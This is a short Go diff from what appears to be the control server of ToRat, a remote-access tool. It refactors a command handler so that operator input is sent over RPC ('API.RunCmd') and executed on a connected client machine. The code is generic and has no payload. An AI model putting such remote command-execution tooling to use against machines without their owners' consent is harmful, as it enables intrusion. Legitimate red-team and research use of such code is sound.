@@ -1,36 +1,24 @@
 package server
 
 import (
-	"fmt"
+	"strings"
+
+	"github.com/abiosoft/ishell"
+	"github.com/lu4p/ToRat/models"
 )
 
-func (c *activeClient) runCommand(command string, print bool) (string, error) {
-	err := c.sendSt(command)
-	if err != nil {
-		if print {
-			fmt.Println("Error while running command:", err)
-		}
-		return "", err
+func (client *activeClient) runCommand(c *ishell.Context) {
+	command := strings.Join(c.Args, " ")
+	var r string
+	args := models.Cmd{
+		Cmd:        command,
+		Powershell: false,
 	}
-	output, err := c.recvSt()
-	if err != nil {
-		fmt.Println("err")
-		return "", err
-	}
-	if print {
-		fmt.Println(output)
-	}
-	return output, nil
-}
 
-func (c *activeClient) runCommandByte(command string) ([]byte, error) {
-	err := c.sendSt(command)
+	err := client.RPC.Call("API.RunCmd", args, &r)
 	if err != nil {
-		return nil, err
+		c.Println(red(err))
 	}
-	b, err := c.recv()
-	if err != nil {
-		return nil, err
-	}
-	return b, nil
+
+	c.Println(r)
 }
